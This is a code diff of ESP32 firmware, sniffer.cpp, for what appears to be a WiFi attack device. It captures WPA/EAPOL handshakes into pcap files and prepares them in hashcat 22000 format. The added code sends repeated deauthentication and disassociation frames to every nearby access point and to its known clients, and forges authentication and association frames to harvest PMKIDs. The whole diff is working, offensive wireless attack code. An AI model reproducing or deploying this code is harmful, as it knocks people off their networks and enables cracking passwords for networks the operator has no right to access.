@@ -1,5 +1,6 @@
 // cap/sniffer.cpp
-// Promiscuous EAPOL capture -> one classic pcap per BSSID.
+// Catch path aligned with 0N3P0rK: lock on EAPOL, bidir kick, PMKID assoc,
+// probe-resp ESSID, WDS/0x888E scan. Files still go to LittleFS.
 
 #include "sniffer.h"
 #include "pcap.h"
@@ -18,13 +19,17 @@ extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) {
 
 namespace Cap {
 
-static const uint16_t FRAME_MAX = 320;
-static const uint8_t  RING_SLOTS = 8;
+static const uint16_t FRAME_MAX = 512;
+static const uint16_t BEACON_MAX = 400;
+static const uint8_t  RING_SLOTS = 12;
 static const uint32_t MAX_FILE_SIZE = 50 * 1024;
 static const uint16_t MAX_FILES = 200;
 static const uint8_t HOP_CHANNELS[] = {1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13};
 static const uint8_t HOP_COUNT = sizeof(HOP_CHANNELS);
-static const uint32_t HOP_INTERVAL_MS = 250;
+static const uint32_t HOP_INTERVAL_MS = 350;
+static const uint16_t LOCK_MS = 8000;
+static const int8_t MIN_RSSI = -92;
+static const uint8_t KICK_BURST = 2;
 
 struct Slot {
     uint8_t  bssid[6];
@@ -49,8 +54,12 @@ static const uint8_t BEACON_SLOTS = 16;
 struct BeaconSlot {
     uint8_t  bssid[6];
     uint8_t  channel;
+    int8_t   rssi;
     uint16_t len;
-    uint8_t  frame[FRAME_MAX];
+    char     ssid[33];
+    uint8_t  clients[4][6];
+    uint8_t  clientN;
+    uint8_t  frame[BEACON_MAX];
 };
 static BeaconSlot s_beacons[BEACON_SLOTS];
 static uint8_t s_beaconCount = 0;
@@ -63,17 +72,76 @@ static bool     s_hopEnabled = false;
 static bool     s_deauthEnabled = false;
 static uint8_t  s_channelIdx = 0;
 static uint32_t s_lastHopMs = 0;
+static uint32_t s_lockUntil = 0;
 static uint8_t  s_apMac[6] = {};
+static uint8_t  s_staMac[6] = {};
 static uint8_t  s_bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+static uint8_t  s_kickSta[6] = {};
+static uint8_t  s_kickBssid[6] = {};
+static bool     s_kickStaOk = false;
+static uint8_t  s_probeIdx = 0;
+static uint32_t s_lastProbeMs = 0;
 
-static void storeBeacon(const uint8_t* bssid, const uint8_t* f, uint16_t len) {
+static void ssidFromMgmt(const uint8_t* f, uint16_t len, char out[33]) {
+    out[0] = '\0';
+    if (!f || len < 38) return;
+    uint16_t off = 24 + 12;
+    while (off + 2 <= len) {
+        uint8_t id = f[off];
+        uint8_t l = f[off + 1];
+        if (off + 2 + l > len) break;
+        if (id == 0 && l > 0 && l <= 32) {
+            memcpy(out, f + off + 2, l);
+            out[l] = '\0';
+            return;
+        }
+        off = (uint16_t)(off + 2 + l);
+    }
+}
+
+static BeaconSlot* findBeacon(const uint8_t* bssid) {
+    for (uint8_t i = 0; i < s_beaconCount; i++) {
+        if (memcmp(s_beacons[i].bssid, bssid, 6) == 0) return &s_beacons[i];
+    }
+    return nullptr;
+}
+
+static void noteClient(const uint8_t* bssid, const uint8_t* sta) {
+    if (!bssid || !sta) return;
+    if (sta[0] & 0x01) return;
+    BeaconSlot* b = findBeacon(bssid);
+    if (!b) return;
+    for (uint8_t i = 0; i < b->clientN; i++) {
+        if (memcmp(b->clients[i], sta, 6) == 0) return;
+    }
+    if (b->clientN < 4) {
+        memcpy(b->clients[b->clientN], sta, 6);
+        b->clientN++;
+        return;
+    }
+    memcpy(b->clients[s_beaconClock % 4], sta, 6);
+}
+
+static bool hopLocked() {
+    if (s_lockUntil != 0 && millis() < s_lockUntil) return true;
+    if (Hc22000::shouldPauseDeauth()) return true;
+    return false;
+}
+
+static void storeBeacon(const uint8_t* bssid, const uint8_t* f, uint16_t len, int8_t rssi) {
     if (!bssid || !f || len < 24) return;
-    if (len > FRAME_MAX) len = FRAME_MAX;
+    if (len > BEACON_MAX) len = BEACON_MAX;
+    char ssid[33];
+    ssidFromMgmt(f, len, ssid);
     for (uint8_t i = 0; i < s_beaconCount; i++) {
         if (memcmp(s_beacons[i].bssid, bssid, 6) == 0) {
             memcpy(s_beacons[i].frame, f, len);
             s_beacons[i].len = len;
             s_beacons[i].channel = s_cnt.currentChannel;
+            s_beacons[i].rssi = rssi;
+            bool learned = ssid[0] && !s_beacons[i].ssid[0];
+            if (ssid[0]) strncpy(s_beacons[i].ssid, ssid, sizeof(s_beacons[i].ssid) - 1);
+            if (learned) Hc22000::feed(f, len);
             return;
         }
     }
@@ -83,18 +151,14 @@ static void storeBeacon(const uint8_t* bssid, const uint8_t* f, uint16_t len) {
     } else {
         idx = s_beaconClock++ % BEACON_SLOTS;
     }
+    memset(&s_beacons[idx], 0, sizeof(s_beacons[idx]));
     memcpy(s_beacons[idx].bssid, bssid, 6);
     memcpy(s_beacons[idx].frame, f, len);
     s_beacons[idx].len = len;
     s_beacons[idx].channel = s_cnt.currentChannel;
+    s_beacons[idx].rssi = rssi;
+    if (ssid[0]) strncpy(s_beacons[idx].ssid, ssid, sizeof(s_beacons[idx].ssid) - 1);
     Hc22000::feed(f, len);
-}
-
-static const BeaconSlot* findBeacon(const uint8_t* bssid) {
-    for (uint8_t i = 0; i < s_beaconCount; i++) {
-        if (memcmp(s_beacons[i].bssid, bssid, 6) == 0) return &s_beacons[i];
-    }
-    return nullptr;
 }
 
 static void IRAM_ATTR promiscuousRxCb(void* buf, wifi_promiscuous_pkt_type_t type) {
@@ -109,8 +173,11 @@ static void IRAM_ATTR promiscuousRxCb(void* buf, wifi_promiscuous_pkt_type_t typ
     const uint8_t* f = pkt->payload;
 
     if (type == WIFI_PKT_MGMT) {
-        if ((f[0] & 0xFC) == 0x80) {
-            storeBeacon(f + 16, f, len);
+        uint8_t fc = f[0] & 0xFC;
+        if (fc == 0x80 || fc == 0x50) {
+            storeBeacon(f + 16, f, len, (int8_t)pkt->rx_ctrl.rssi);
+        } else if (fc == 0x10) {
+            Hc22000::feed(f, len);
         }
         return;
     }
@@ -129,20 +196,36 @@ static void IRAM_ATTR promiscuousRxCb(void* buf, wifi_promiscuous_pkt_type_t typ
     } else if (!toDs && fromDs) {
         bssid   = f + 10;
         station = f + 4;
+    } else if (toDs && fromDs) {
+        bssid   = f + 16;
+        station = f + 10;
+        bodyOff = 30;
     } else {
-        return;
+        bssid   = f + 16;
+        station = f + 10;
     }
 
-    bool isQosData = (f[0] & 0x80) != 0;
-    if (isQosData) bodyOff += 2;
-    if ((f[1] & 0x80) != 0) bodyOff += 4;
+    uint8_t subtype = (f[0] >> 4) & 0x0F;
+    if (subtype & 0x08) bodyOff += 2;
+    if ((subtype & 0x08) && (f[1] & 0x80)) bodyOff += 4;
 
-    if (bodyOff + 8 > len) return;
-    if (f[bodyOff] != 0xAA || f[bodyOff + 1] != 0xAA || f[bodyOff + 2] != 0x03) return;
-    uint16_t ethertype = ((uint16_t)f[bodyOff + 6] << 8) | f[bodyOff + 7];
-    if (ethertype != 0x888E) return;
+    if (bssid && station) noteClient(bssid, station);
+
+    bool eapol = false;
+    if (bodyOff + 8 <= len &&
+        f[bodyOff] == 0xAA && f[bodyOff + 1] == 0xAA && f[bodyOff + 2] == 0x03 &&
+        f[bodyOff + 6] == 0x88 && f[bodyOff + 7] == 0x8E) {
+        eapol = true;
+    }
+    if (!eapol) {
+        for (uint16_t i = bodyOff; i + 1 < len; i++) {
+            if (f[i] == 0x88 && f[i + 1] == 0x8E) { eapol = true; break; }
+        }
+    }
+    if (!eapol || !bssid) return;
 
     s_cnt.framesEapol++;
+    s_lockUntil = millis() + LOCK_MS;
 
     uint8_t next = (uint8_t)((s_write + 1) % RING_SLOTS);
     if (next == s_read) {
@@ -151,7 +234,8 @@ static void IRAM_ATTR promiscuousRxCb(void* buf, wifi_promiscuous_pkt_type_t typ
     }
     Slot& s = s_ring[s_write];
     memcpy(s.bssid, bssid, 6);
-    memcpy(s.station, station, 6);
+    if (station) memcpy(s.station, station, 6);
+    else memset(s.station, 0, 6);
     s.len = (len > FRAME_MAX) ? FRAME_MAX : len;
     s.ts  = millis();
     memcpy(s.frame, f, s.len);
@@ -242,11 +326,13 @@ static bool openFileForBssid(const uint8_t* bssid) {
         memcpy(s_fileName, name, sizeof(s_fileName));
         s_fileOpen = true;
 
-        if (createdNew) {
-            const BeaconSlot* bcn = findBeacon(bssid);
-            if (bcn) {
-                writePcapPacket(bcn->frame, bcn->len, millis());
-                Hc22000::feed(bcn->frame, bcn->len);
+        const BeaconSlot* bcn = findBeacon(bssid);
+        if (bcn && (createdNew || s_fileSize < 80)) {
+            writePcapPacket(bcn->frame, bcn->len, millis());
+            Hc22000::feed(bcn->frame, bcn->len);
+            if (bcn->ssid[0]) {
+                strncpy(s_cnt.lastHsSsid, bcn->ssid, sizeof(s_cnt.lastHsSsid) - 1);
+                s_cnt.lastHsSsid[sizeof(s_cnt.lastHsSsid) - 1] = '\0';
             }
         }
         return true;
@@ -275,10 +361,18 @@ static void writeFrameToFile(const Slot& s) {
     }
     s_cnt.framesWritten++;
     Hc22000::feed(s.frame, s.len);
+    memcpy(s_kickBssid, s.bssid, 6);
+    memcpy(s_kickSta, s.station, 6);
+    s_kickStaOk = (s.station[0] & 0x01) == 0;
     snprintf(s_cnt.currentBssid, sizeof(s_cnt.currentBssid),
              "%02X:%02X:%02X:%02X:%02X:%02X",
              s.bssid[0], s.bssid[1], s.bssid[2],
              s.bssid[3], s.bssid[4], s.bssid[5]);
+    const BeaconSlot* bcn = findBeacon(s.bssid);
+    if (bcn && bcn->ssid[0]) {
+        strncpy(s_cnt.lastHsSsid, bcn->ssid, sizeof(s_cnt.lastHsSsid) - 1);
+        s_cnt.lastHsSsid[sizeof(s_cnt.lastHsSsid) - 1] = '\0';
+    }
 }
 
 static void drainRing() {
@@ -294,7 +388,7 @@ static bool isOwnAp(const uint8_t* bssid) {
     return memcmp(bssid, s_apMac, 6) == 0;
 }
 
-static void sendRawMgmt(uint8_t fc0, const uint8_t* bssid) {
+static void sendRawMgmt(uint8_t fc0, const uint8_t* bssid, const uint8_t* dest) {
     uint8_t pkt[26] = {
         fc0, 0x00,
         0x00, 0x00,
@@ -304,7 +398,7 @@ static void sendRawMgmt(uint8_t fc0, const uint8_t* bssid) {
         0x00, 0x00,
         0x07, 0x00
     };
-    memcpy(pkt + 4, s_bcast, 6);
+    memcpy(pkt + 4, dest, 6);
     memcpy(pkt + 10, bssid, 6);
     memcpy(pkt + 16, bssid, 6);
     esp_err_t e = esp_wifi_80211_tx(WIFI_IF_AP, pkt, sizeof(pkt), false);
@@ -312,15 +406,123 @@ static void sendRawMgmt(uint8_t fc0, const uint8_t* bssid) {
     if (e == ESP_OK) s_cnt.framesDeauth++;
 }
 
+static void sendRawSta(uint8_t fc0, const uint8_t* bssid, const uint8_t* sta) {
+    uint8_t pkt[26] = {
+        fc0, 0x00,
+        0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00,
+        0x07, 0x00
+    };
+    memcpy(pkt + 4, bssid, 6);
+    memcpy(pkt + 10, sta, 6);
+    memcpy(pkt + 16, bssid, 6);
+    esp_err_t e = esp_wifi_80211_tx(WIFI_IF_AP, pkt, sizeof(pkt), false);
+    if (e != ESP_OK) e = esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
+    if (e == ESP_OK) s_cnt.framesDeauth++;
+}
+
+static void sendAuth(const uint8_t* bssid) {
+    uint8_t pkt[30] = {
+        0xB0, 0x00,
+        0x00, 0x00,
+        0,0,0,0,0,0,
+        0,0,0,0,0,0,
+        0,0,0,0,0,0,
+        0x00, 0x00,
+        0x00, 0x00,
+        0x01, 0x00,
+        0x00, 0x00
+    };
+    memcpy(pkt + 4, bssid, 6);
+    memcpy(pkt + 10, s_staMac, 6);
+    memcpy(pkt + 16, bssid, 6);
+    esp_wifi_80211_tx(WIFI_IF_AP, pkt, sizeof(pkt), false);
+}
+
+static void sendAssoc(const uint8_t* bssid, const char* ssid) {
+    if (!ssid || !ssid[0]) return;
+    size_t sl = strlen(ssid);
+    if (sl > 32) sl = 32;
+    uint8_t pkt[96];
+    memset(pkt, 0, sizeof(pkt));
+    pkt[0] = 0x00;
+    pkt[1] = 0x00;
+    memcpy(pkt + 4, bssid, 6);
+    memcpy(pkt + 10, s_staMac, 6);
+    memcpy(pkt + 16, bssid, 6);
+    pkt[24] = 0x31;
+    pkt[25] = 0x04;
+    pkt[26] = 0x0A;
+    pkt[27] = 0x00;
+    pkt[28] = 0x00;
+    pkt[29] = (uint8_t)sl;
+    memcpy(pkt + 30, ssid, sl);
+    uint16_t n = (uint16_t)(30 + sl);
+    pkt[n++] = 0x01;
+    pkt[n++] = 0x08;
+    pkt[n++] = 0x82; pkt[n++] = 0x84; pkt[n++] = 0x8B; pkt[n++] = 0x96;
+    pkt[n++] = 0x0C; pkt[n++] = 0x12; pkt[n++] = 0x18; pkt[n++] = 0x24;
+    pkt[n++] = 0x30;
+    pkt[n++] = 0x14;
+    pkt[n++] = 0x01; pkt[n++] = 0x00;
+    pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x04;
+    pkt[n++] = 0x01; pkt[n++] = 0x00;
+    pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x04;
+    pkt[n++] = 0x01; pkt[n++] = 0x00;
+    pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x02;
+    pkt[n++] = 0x00; pkt[n++] = 0x00;
+    esp_wifi_80211_tx(WIFI_IF_AP, pkt, n, false);
+}
+
+static void pmkidOnThisChannel() {
+    uint32_t now = millis();
+    if (now - s_lastProbeMs < 1500) return;
+    uint8_t ch = s_cnt.currentChannel;
+    uint8_t n = s_beaconCount;
+    if (!n) return;
+    for (uint8_t k = 0; k < n; k++) {
+        s_probeIdx = (uint8_t)((s_probeIdx + 1) % n);
+        BeaconSlot& b = s_beacons[s_probeIdx];
+        if (b.channel != ch) continue;
+        if (isOwnAp(b.bssid)) continue;
+        if (b.rssi < MIN_RSSI) continue;
+        if (!b.ssid[0]) continue;
+        if (Hc22000::hasPair(b.bssid)) continue;
+        sendAuth(b.bssid);
+        sendAssoc(b.bssid, b.ssid);
+        s_lastProbeMs = now;
+        return;
+    }
+}
+
 static void kickOnThisChannel() {
     if (!s_deauthEnabled) return;
-    if (Hc22000::shouldPauseDeauth()) return;
+    if (hopLocked()) return;
     uint8_t ch = s_cnt.currentChannel;
     for (uint8_t i = 0; i < s_beaconCount; i++) {
-        if (s_beacons[i].channel != ch) continue;
-        if (isOwnAp(s_beacons[i].bssid)) continue;
-        sendRawMgmt(0xC0, s_beacons[i].bssid); // deauth
-        sendRawMgmt(0xA0, s_beacons[i].bssid); // disassoc
+        BeaconSlot& b = s_beacons[i];
+        if (b.channel != ch) continue;
+        if (isOwnAp(b.bssid)) continue;
+        if (b.rssi < MIN_RSSI) continue;
+        if (Hc22000::hasPair(b.bssid)) continue;
+
+        for (uint8_t r = 0; r < KICK_BURST; r++) {
+            sendRawMgmt(0xC0, b.bssid, s_bcast);
+            sendRawMgmt(0xA0, b.bssid, s_bcast);
+        }
+        for (uint8_t c = 0; c < b.clientN; c++) {
+            sendRawMgmt(0xC0, b.bssid, b.clients[c]);
+            sendRawMgmt(0xA0, b.bssid, b.clients[c]);
+            sendRawSta(0xC0, b.bssid, b.clients[c]);
+            sendRawSta(0xA0, b.bssid, b.clients[c]);
+        }
+        if (s_kickStaOk && memcmp(s_kickBssid, b.bssid, 6) == 0) {
+            sendRawMgmt(0xC0, b.bssid, s_kickSta);
+            sendRawSta(0xC0, b.bssid, s_kickSta);
+        }
         yield();
     }
 }
@@ -345,12 +547,21 @@ static void startCommon(RunMode mode) {
     s_read = 0;
     s_cnt = {};
     s_cnt.currentBssid[0] = 0;
+    s_cnt.lastHsSsid[0] = 0;
     s_lastHopMs = millis();
     s_channelIdx = 0;
+    s_lockUntil = 0;
+    s_kickStaOk = false;
+    s_lastProbeMs = 0;
     s_mode = mode;
     s_hopEnabled = (mode == RunMode::Aggressive);
     s_deauthEnabled = (mode == RunMode::Aggressive);
+    s_beaconCount = 0;
+
+    WiFi.setSleep(false);
     WiFi.softAPmacAddress(s_apMac);
+    memcpy(s_staMac, s_apMac, 6);
+    s_staMac[5] ^= 0x5A;
 
     if (s_hopEnabled) {
         Net::setApSsidTemporary(Net::AP_SSID_CAP);
@@ -361,6 +572,9 @@ static void startCommon(RunMode mode) {
     esp_wifi_get_channel(&ch, &sec);
     s_cnt.currentChannel = ch ? ch : 1;
 
+    wifi_promiscuous_filter_t filt{};
+    filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
+    esp_wifi_set_promiscuous_filter(&filt);
     esp_wifi_set_promiscuous_rx_cb(&promiscuousRxCb);
     esp_wifi_set_promiscuous(true);
     s_running = true;
@@ -370,10 +584,10 @@ static void startCommon(RunMode mode) {
         s_cnt.currentChannel = HOP_CHANNELS[0];
     }
 
-    Serial.printf("[CAP] %s hop=%u deauth=%u ch=%u\n",
+    Serial.printf("[CAP] %s hop=%u deauth=%u ch=%u lock=%u\n",
                   mode == RunMode::Aggressive ? "AGGRESSIVE" : "light",
                   (unsigned)s_hopEnabled, (unsigned)s_deauthEnabled,
-                  (unsigned)s_cnt.currentChannel);
+                  (unsigned)s_cnt.currentChannel, (unsigned)LOCK_MS);
 }
 
 void startLight() {
@@ -391,6 +605,7 @@ void stop() {
     s_deauthEnabled = false;
     s_hopEnabled = false;
     s_mode = RunMode::Off;
+    s_lockUntil = 0;
     esp_wifi_set_promiscuous(false);
     esp_wifi_set_promiscuous_rx_cb(nullptr);
     drainRing();
@@ -404,6 +619,7 @@ void stop() {
 
 bool isRunning() { return s_running; }
 RunMode runMode() { return s_mode; }
+bool isLocked() { return s_running && hopLocked(); }
 
 const Counters& counters() { return s_cnt; }
 
@@ -412,8 +628,18 @@ void loop() {
 
     drainRing();
 
-    if (!s_hopEnabled) return;
     uint32_t now = millis();
+    if (hopLocked()) {
+        return;
+    }
+    pmkidOnThisChannel();
+
+    if (!s_hopEnabled) {
+        if (now - s_lastHopMs >= 400) {
+            s_lastHopMs = now;
+        }
+        return;
+    }
     if (now - s_lastHopMs >= HOP_INTERVAL_MS) {
         s_lastHopMs = now;
         s_channelIdx = (uint8_t)((s_channelIdx + 1) % HOP_COUNT);
